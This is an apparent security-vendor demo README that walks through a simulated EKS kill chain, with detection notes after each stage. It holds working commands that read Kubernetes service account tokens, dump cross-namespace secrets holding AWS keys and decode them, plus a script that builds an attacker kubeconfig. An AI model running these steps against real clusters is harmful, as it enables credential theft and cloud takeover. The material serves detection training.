## 🛠️ Orca Security EKS Attack Detection Demo

### 🔥 Scenario Summary:

We simulate a multi-stage cloud attack starting from a vulnerable Confluence Server (**CVE-2023-22515**) running in EKS. The attacker exploits the vulnerability to get a reverse-shell in the pod, uses a misconfigured service account to gain cluster-admin access, pivots to a GitLab Runner pod (configured with AWS credentials), and then uses those credentials to interact with AWS (e.g., S3 access, Crypto miner...).

---

## 🧪 Attacker Flow (Full Kill Chain)

### ✅ Stage 1: Initial Access via Confluence Exploit

- Attacker exploits CVE-2023-22515 (auth bypass + RCE) in Confluence-Server 8.5.0
- Gets shell inside the `confluence` pod

---
### 🛡️ Orca Detection:

Vulnerability Alert: Orca detects CVE-2023-22515 as a critical vulnerability.

Workload Exposure: The Confluence pod is exposed externally — Orca highlights the exposure and potential exploit path.

Malicious Process Behavior: If the attacker spawns an interactive shell, Orca detects anomalous process execution.

---

### ✅ Stage 2: Internal Kubernetes API Access via Service Account Token

Once inside the pod, the attacker extracts the Kubernetes ServiceAccount credentials:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token > sa.token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace > namespace.txt
```

These files give the attacker:

- `sa.token`: a Bearer JWT for Kubernetes API access
- `ca.crt`: the cluster’s Certificate Authority for TLS verification
- `namespace.txt`: current namespace (e.g., `confluence`)

They also extract the internal Kubernetes API server address from the env variables:

```bash
echo "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
# Usually https://10.100.0.1:443
```

They can now use `curl` inside the pod to interact with the API:

```bash
curl --cacert ca.crt \
  -H "Authorization: Bearer $(cat sa.token)" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api
```
---
### 🛡️ Orca Detection:

Toxic Combination Alert: Orca detects that the default ServiceAccount in the confluence namespace is bound to cluster-admin.

RBAC Misconfiguration: Elevated access for a workload-exposed ServiceAccount is flagged.

Access Pattern Monitoring: Usage of the service account to query sensitive resources triggers anomaly alerts if audit logs are integrated.

---

### ✅ Stage 3: Discover GitLab Runner and Steal AWS Credentials

#### 🔍 Step 1: List All Namespaces

```bash
curl --cacert ca.crt \
  -H "Authorization: Bearer $(cat sa.token)" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces
```

Search output for lines like `"name":"gitlab-runner"` to find the target namespace.

#### 🔍 Step 2: List Pods in GitLab Runner Namespace

```bash
curl --cacert ca.crt \
  -H "Authorization: Bearer $(cat sa.token)" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/gitlab-runner/pods
```

Search for pod names (look for `"name":"gitlab-runner-xxxxx"`).

#### 🔍 Step 3: Get Pod Environment to Identify Secrets

```bash
curl --cacert ca.crt \
  -H "Authorization: Bearer $(cat sa.token)" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/gitlab-runner/pods/gitlab-runner-xxxxx
```

Look inside for `env` section. You'll see references to:

- Secret: `aws-credentials`
- Keys: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`

#### 🔍 Step 4: Dump the Secret

```bash
curl --cacert ca.crt \
  -H "Authorization: Bearer $(cat sa.token)" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/gitlab-runner/secrets/aws-credentials
```

Search for base64 values of:

- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`

Decode with:

```bash
echo "<base64>" | base64 -d
```

🎉 You now have AWS credentials — without ever entering the GitLab pod.

---
### 🛡️ Orca Detection:

Lateral Movement Alert: Orca detects access to resources in other namespaces from a compromised SA.

Sensitive Data in Secrets: Orca flags secrets containing AWS keys as critical posture risks.

Cross-namespace Secret Access: Unusual access patterns between unrelated workloads trigger risk indicators.

---

### ✅ Stage 4: Cloud Pivot with Stolen AWS Credentials

On your attacker machine:

```bash
export AWS_ACCESS_KEY_ID=XXXXX
export AWS_SECRET_ACCESS_KEY=XXXXX
```

#### Get Caller Identity

```bash
aws sts get-caller-identity
```

#### List Clusters and Get EKS Endpoint

```bash
aws eks list-clusters --region us-east-1
aws eks describe-cluster --name orca-eks-demo --region us-east-1 --query "cluster.endpoint" --output text
```

Now you can generate a valid kubeconfig with the original Confluence service account token and the external EKS API URL.

---
### 🛡️ Orca Detection:

CloudTrail Anomalies: Orca detects AWS credentials being used in abnormal patterns, geographies, or service contexts.

Credential Misuse Detection: The GitLab role is used in unexpected ways, triggering alerts.

Sensitive Asset Access: Orca alerts on S3 reads or IAM actions from compromised identities.

Correlation Across Layers: Orca correlates the use of Kubernetes credentials with subsequent AWS abuse for a unified incident timeline.

---

### ✅ Bonus: Reconfigure `kubectl` on Attacker Machine with Stolen Token

If attacker cannot install `kubectl` inside the Confluence pod, they can copy the token, CA cert, and API server info, then use this script on their own system:

#### `generate_kubeconfig.sh`

```bash
#!/bin/bash

# Usage: ./generate_kubeconfig.sh <path-to-sa.token> <path-to-ca.crt> <EKS_CLUSTER_ENDPOINT>
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <path-to-sa.token> <path-to-ca.crt> <EKS_CLUSTER_ENDPOINT>"
  exit 1
fi

SA_TOKEN=$(cat "$1" | tr -d '\n')
CA_CERT=$(base64 -w0 "$2")
CLUSTER_ENDPOINT="$3"

cat <<EOF > attacker-kubeconfig.yaml
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data: $CA_CERT
    server: $CLUSTER_ENDPOINT
  name: eks-orca-demo
contexts:
- context:
    cluster: eks-orca-demo
    namespace: confluence
    user: attacker
  name: attacker-context
current-context: attacker-context
users:
- name: attacker
  user:
    token: $SA_TOKEN
EOF

echo "✅ Kubeconfig written to attacker-kubeconfig.yaml"
```

Then use it:

```bash
kubectl --kubeconfig attacker-kubeconfig.yaml get pods -A
```
